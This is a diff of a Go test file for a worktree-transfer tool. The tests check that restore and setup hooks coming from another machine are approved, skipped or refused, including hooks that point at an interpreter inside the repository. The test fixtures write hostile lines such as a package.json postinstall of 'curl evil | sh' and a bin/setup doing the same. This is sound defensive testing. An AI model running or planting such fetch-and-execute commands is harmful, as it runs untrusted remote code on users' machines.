@@ -43,7 +43,7 @@ func TestForTerminalEscapesControlCharacters(t *testing.T) {
 func TestRestoreFromKantAsksEveryRunOnTheLaptop(t *testing.T) {
 	w := newWorld(t)
 	wt := w.laptopTask()
-	w.mustFerry(wt, "to", "kant", "--yes", "--no-launch")
+	w.mustFerry(wt, "to", "kant", "--yes", "--skip-scripts", "--no-launch")
 	kwt := filepath.Join(w.kant, "src/app-wt/fix-auth")
 	w.write(kwt, "package.json", `{"scripts":{"postinstall":"curl evil | sh"}}`)
 	w.approve(w.laptop, restoreScript) // approved before; still has to ask
@@ -51,9 +51,9 @@ func TestRestoreFromKantAsksEveryRunOnTheLaptop(t *testing.T) {
 	// Restore's marker from kant's run would travel back as an ignored file.
 	os.Remove(filepath.Join(kwt, ".restored"))
 
-	out := w.mustFerry(w.laptop, "from", "kant", "fix-auth", "--yes")
+	out := w.mustFerry(w.laptop, "from", "kant", "fix-auth", "--yes", "--skip-scripts")
 	if !strings.Contains(out, "asks before every run") || !strings.Contains(out, "skipped") {
-		t.Fatalf("restore should ask (and, with no terminal, skip):\n%s", out)
+		t.Fatalf("restore should ask (and, with --skip-scripts, skip):\n%s", out)
 	}
 	if !strings.Contains(out, "build and setup files: package.json") {
 		t.Fatalf("the package.json change should be called out:\n%s", out)
@@ -69,7 +69,7 @@ func TestOversizedHookIsNeverRun(t *testing.T) {
 	big := "#!/bin/sh\n" + strings.Repeat("# padding\n", maxHookSize/10+10) + "touch \"$FERRY_ROOT/.restored\"\n"
 	w.write(wt, ".ferry/restore", big)
 	w.approve(w.kant, big)
-	out := w.mustFerry(wt, "to", "kant", "--yes", "--no-launch")
+	out := w.mustFerry(wt, "to", "kant", "--yes", "--skip-scripts", "--no-launch")
 	if !strings.Contains(out, "too large to review") {
 		t.Fatalf("expected a too-large refusal:\n%s", out)
 	}
@@ -97,18 +97,54 @@ func TestRunHookRefusesBytesThatWerentApproved(t *testing.T) {
 	}
 }
 
+// Approval covers a hook's own bytes, so a #! line naming a repo file
+// would run whatever the other machine put there. Such a hook never runs,
+// approved or not; an interpreter outside the home does.
+func TestHookWithARepoInterpreterNeverRuns(t *testing.T) {
+	home := t.TempDir()
+	l := &Local{Home: home}
+	wt := filepath.Join(home, "src/app")
+	os.MkdirAll(filepath.Join(wt, ".ferry"), 0o755)
+	os.MkdirAll(filepath.Join(wt, "tools"), 0o755)
+	os.WriteFile(filepath.Join(wt, "tools/interp"), []byte("#!/bin/sh\ntouch \"$HOME/pwned\"\n"), 0o755)
+	for _, shebang := range []string{"#!./tools/interp", "#!" + filepath.Join(wt, "tools/interp"), "#!/usr/bin/env ./tools/interp", "#!/usr/bin/env -S sh ./tools/interp"} {
+		hook := shebang + "\necho harmless\n"
+		os.WriteFile(filepath.Join(wt, ".ferry/restore"), []byte(hook), 0o755)
+		l.Approve(hashHook([]byte(hook)))
+		q := HookReq{WtRel: "src/app", Name: "restore"}
+		if info, _ := l.HookInfo(q); info.Refused == "" {
+			t.Errorf("%s: HookInfo didn't refuse it", shebang)
+		}
+		q.SHA = hashHook([]byte(hook))
+		if _, err := l.RunHook(q); err == nil {
+			t.Errorf("%s: RunHook ran it", shebang)
+		}
+	}
+	if exists(filepath.Join(home, "pwned")) {
+		t.Fatal("the repo's interpreter ran")
+	}
+	for _, shebang := range []string{"#!/bin/sh", "#!/usr/bin/env sh", ""} {
+		hook := shebang + "\necho ok\n"
+		os.WriteFile(filepath.Join(wt, ".ferry/restore"), []byte(hook), 0o755)
+		l.Approve(hashHook([]byte(hook)))
+		if res, err := l.RunHook(HookReq{WtRel: "src/app", Name: "restore", SHA: hashHook([]byte(hook))}); err != nil || !res.OK {
+			t.Errorf("%q: %v %+v", shebang, err, res)
+		}
+	}
+}
+
 func TestDehydrateAsksEveryRunOnceTheTaskHasBeenOnKant(t *testing.T) {
 	w := newWorld(t)
 	wt := w.laptopTask()
-	w.mustFerry(wt, "to", "kant", "--yes", "--no-launch")
+	w.mustFerry(wt, "to", "kant", "--yes", "--skip-scripts", "--no-launch")
 	kwt := filepath.Join(w.kant, "src/app-wt/fix-auth")
 	w.write(kwt, "bin/setup", "#!/bin/sh\ncurl evil | sh\n")
 	w.approve(w.kant, dehydrateScript)
-	w.mustFerry(w.laptop, "from", "kant", "fix-auth", "--yes")
+	w.mustFerry(w.laptop, "from", "kant", "fix-auth", "--yes", "--skip-scripts")
 	os.Remove(filepath.Join(wt, ".ferry/state/db.dump"))
 
 	// dehydrateScript is approved on the laptop, but the worktree now holds
-	// kant's code, so it must still ask (and, with no terminal, skip).
+	// kant's code, so it must still ask (and, with no terminal, stop).
 	out, _ := w.ferry(wt, "to", "kant", "--yes", "--no-launch")
 	if !strings.Contains(out, "asks before every run") || !strings.Contains(out, "bin/setup") {
 		t.Fatalf("dehydrate should ask and call out bin/setup:\n%s", out)
@@ -121,7 +157,7 @@ func TestDehydrateAsksEveryRunOnceTheTaskHasBeenOnKant(t *testing.T) {
 func TestChangeSummaryIgnoresTheRecordOnKant(t *testing.T) {
 	w := newWorld(t)
 	wt := w.laptopTask()
-	w.mustFerry(wt, "to", "kant", "--yes", "--no-launch")
+	w.mustFerry(wt, "to", "kant", "--yes", "--skip-scripts", "--no-launch")
 	w.write(filepath.Join(w.kant, "src/app-wt/fix-auth"), "package.json", "{}\n")
 	w.approve(w.kant, dehydrateScript)
 	// Stop the handoff after its commit point, so the rerun works from the
@@ -140,7 +176,7 @@ func TestChangeSummaryIgnoresTheRecordOnKant(t *testing.T) {
 	data, _ = json.Marshal(rec)
 	os.WriteFile(rp, data, 0o600)
 
-	out := w.mustFerry(w.laptop, "from", "kant", "fix-auth", "--yes")
+	out := w.mustFerry(w.laptop, "from", "kant", "fix-auth", "--yes", "--skip-scripts")
 	if strings.Contains(out, "nothing to see here") || !strings.Contains(out, "package.json") {
 		t.Fatalf("summary should come from the laptop's own refs:\n%s", out)
 	}
@@ -152,18 +188,18 @@ func TestChangeSummaryIgnoresTheRecordOnKant(t *testing.T) {
 func TestDehydrateSummaryAfterANoChangeRoundTrip(t *testing.T) {
 	w := newWorld(t)
 	wt := w.laptopTask()
-	w.mustFerry(wt, "to", "kant", "--yes", "--no-launch")
+	w.mustFerry(wt, "to", "kant", "--yes", "--skip-scripts", "--no-launch")
 	w.approve(w.kant, dehydrateScript)
-	w.mustFerry(w.laptop, "from", "kant", "fix-auth", "--yes")
+	w.mustFerry(w.laptop, "from", "kant", "fix-auth", "--yes", "--skip-scripts")
 
-	out := w.mustFerry(wt, "to", "kant", "--yes", "--no-launch")
+	out := w.mustFerry(wt, "to", "kant", "--yes", "--skip-scripts", "--no-launch")
 	if !strings.Contains(out, "no files changed") || strings.Contains(out, "untracked.txt") {
 		t.Fatalf("expected the dehydrate prompt to say no files changed:\n%s", out)
 	}
 
-	w.mustFerry(w.laptop, "from", "kant", "fix-auth", "--yes")
+	w.mustFerry(w.laptop, "from", "kant", "fix-auth", "--yes", "--skip-scripts")
 	os.Remove(filepath.Join(wt, "untracked.txt"))
-	out = w.mustFerry(wt, "to", "kant", "--yes", "--no-launch")
+	out = w.mustFerry(wt, "to", "kant", "--yes", "--skip-scripts", "--no-launch")
 	if n := strings.Count(out, "untracked.txt"); n != 1 || !strings.Contains(out, "other files (1)") {
 		t.Fatalf("expected the deleted untracked.txt listed once, got %d:\n%s", n, out)
 	}
